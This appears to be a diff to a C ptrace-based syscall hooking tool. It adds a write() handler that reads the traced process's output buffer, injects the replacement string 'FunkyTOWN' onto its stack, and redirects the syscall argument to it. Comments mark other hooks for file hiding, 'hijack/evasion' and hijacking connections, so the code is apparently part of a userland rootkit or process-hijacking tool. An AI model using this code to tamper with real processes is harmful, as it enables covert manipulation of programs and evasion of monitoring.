@@ -231,6 +231,30 @@ int syscall_execve(int pid, struct user_regs_struct regs) {
     
 }
 
+int syscall_write(int pid, struct user_regs_struct regs) {
+    static in_syscall;
+    long buf_addr, esp_addr;
+    char *buf= (char *)malloc(1000);
+    //entering the system call
+    if(in_syscall == 0) {
+	buf_addr=ptrace(PTRACE_PEEKUSER, pid, ECX*4, 0);
+	esp_addr = regs.esp;
+	esp_addr = esp_addr - 0x4; // We're gunna put our buffer on the stack
+	p_getstr(pid, buf, buf_addr);
+	printf("caught write(\"%s\")\n", buf);
+	printf("attempting to modify..");
+	putdata(pid, esp_addr, "FunkyTOWN\n", 10);
+	regs.ecx=esp_addr; // put the stack pointer in write(x, HERE, x)
+	ptrace(PTRACE_SETREGS, pid, NULL, &regs);
+	free(buf);
+	in_syscall = 1;
+    }
+    else {
+	in_syscall = 0;
+    }
+    
+}
+
 /**************************End of syscall handlers*********************/
 
 int hookem(int pid) {
@@ -266,6 +290,7 @@ int hookem(int pid) {
 //			case __NR_getdents64: syscall_getdents64(pid,regz); break; // HIDE :D
 			// case __NR_fork: syscall_fork(pid,regz); break; // to follow procs -- this needs to be clone()
 			case __NR_clone: 
+			    break;
 			    ret=syscall_fork(pid,regz);
 			    printf("attempting to follow after pid: %d\n", ret);
 			    ptrace(PTRACE_DETACH, pid, NULL, 0);
@@ -274,7 +299,7 @@ int hookem(int pid) {
 //			case __NR_unlink: syscall_unlink(pid,regz); break; // protection
 //			case __NR_kill: syscall_kill(pid,regz); break; // protection
 //			case __NR_read: syscall_read(pid,regz); break; // various
-//			case __NR_write: syscall_write(pid,regz); break; // various
+			case __NR_write: syscall_write(pid,regz); break; // various
 //			case __NR_init_module: syscall_init_module(pid,regz); break; // to hijack/evasion
 			case __NR_execve: syscall_execve(pid,regz); break; // to monitor/evasion
 //			case __NR_bind: syscall_bind(pid,regz); break; // to hijack connections/monitor
